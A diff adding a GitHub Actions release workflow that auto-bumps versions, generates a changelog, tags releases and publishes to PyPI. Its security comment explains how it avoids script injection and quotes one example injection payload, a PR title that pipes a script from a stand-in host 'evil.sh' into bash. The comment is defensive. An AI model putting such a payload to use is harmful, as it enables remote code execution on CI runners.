@@ -1,0 +1,124 @@
+name: Release
+
+# Single job, triggered on every push to main -- deliberately not split into a tag-triggered second workflow.
+# The version-bump commit and the release tag this job creates are both pushed using the default GITHUB_TOKEN,
+# and GitHub's own anti-recursion rule is that a push authenticated by the default GITHUB_TOKEN never triggers
+# another `on: push` (or `on: create`) workflow run. Splitting this into "bump on push" + "publish on tag push"
+# would mean the second workflow can never fire from the first's own tag push -- it would only ever run if a
+# human pushed a tag by hand. Keeping everything in one job sidesteps that trap entirely.
+#
+# Security note on how this workflow avoids script injection: the only externally-influenced text this job ever
+# handles is PR titles/commit subjects. That text is never spliced into a `run:` block via `${{ }}` (the classic
+# GitHub Actions injection vector: `${{ }}` substitution rewrites the workflow's shell script *before* the shell
+# ever runs it, so a title like `"; curl evil.sh | bash #` becomes literal shell syntax). Instead:
+#   - release-drafter is used ONLY for its `tag_name` output (a short, action-generated `vX.Y.Z` string from our
+#     own tag-template, not raw PR text) to decide the next version number -- its `body` output (built from raw
+#     PR titles) is never read at all.
+#   - The actual changelog/release-notes text is built by .github/scripts/render_changelog.py, which reads
+#     `git log` itself at runtime and writes straight to a file; nothing from that text ever passes through a
+#     workflow expression.
+#   - Every value that IS passed between steps (tag_name, resolved version, bumped flag) goes through `env:`
+#     indirection and is read back with `$VAR` inside `run:`, never inlined via `${{ }}` in the script body.
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+  pull-requests: read
+
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          fetch-tags: true
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Resolve next version (release-drafter dry run)
+        id: drafter
+        uses: release-drafter/release-drafter@v6
+        with:
+          disable-releaser: true
+          commitish: main
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Decide version and whether to auto-bump
+        id: version
+        env:
+          DRAFTED_TAG: ${{ steps.drafter.outputs.tag_name }}
+        run: python3 .github/scripts/resolve_version.py
+
+      - name: Update pyproject.toml version (auto-bump path only)
+        if: steps.version.outputs.bumped == 'true'
+        env:
+          NEW_VERSION: ${{ steps.version.outputs.version }}
+        run: python3 .github/scripts/bump_version.py
+
+      - name: Generate changelog entry
+        env:
+          NEW_VERSION: ${{ steps.version.outputs.version }}
+          PREVIOUS_TAG: ${{ steps.version.outputs.previous_tag }}
+        run: python3 .github/scripts/render_changelog.py
+
+      - name: Commit changelog (and version bump if auto-bumped)
+        env:
+          NEW_VERSION: ${{ steps.version.outputs.version }}
+          BUMPED: ${{ steps.version.outputs.bumped }}
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add CHANGELOG.md
+          if [ "$BUMPED" = "true" ]; then
+            git add pyproject.toml
+          fi
+          if git diff --cached --quiet; then
+            echo "Nothing to commit."
+          else
+            git commit -m "chore(release): v${NEW_VERSION}"
+            git push origin HEAD:main
+          fi
+
+      - name: Create tag and GitHub Release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ steps.version.outputs.version }}
+        run: |
+          TAG="v${VERSION}"
+          if git rev-parse "$TAG" >/dev/null 2>&1; then
+            echo "Tag $TAG already exists -- nothing to release."
+            exit 0
+          fi
+          gh release create "$TAG" --title "$TAG" --notes-file /tmp/release_notes.md --target main
+
+      - name: Build package
+        run: |
+          python -m pip install --upgrade pip build
+          python -m build
+
+      - name: Check for a configured PyPI token
+        # `secrets` isn't a valid context inside a step `if:` condition -- only inside `env:`/`with:` etc. -- so
+        # the presence check has to happen here, in a `run:` step, and be handed to the next step's `if:` as a
+        # plain step output instead.
+        id: pypi_token
+        env:
+          PYPI_API_TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+        run: echo "present=$([ -n "$PYPI_API_TOKEN" ] && echo true || echo false)" >> "$GITHUB_OUTPUT"
+
+      - name: Publish to PyPI
+        # Skip publish (but keep the tag/GitHub Release above) when no token is configured, rather than failing
+        # the whole release. Add a PYPI_API_TOKEN repository secret to enable this step.
+        if: steps.pypi_token.outputs.present == 'true'
+        uses: pypa/gh-action-pypi-publish@release/v1
+        with:
+          password: ${{ secrets.PYPI_API_TOKEN }}
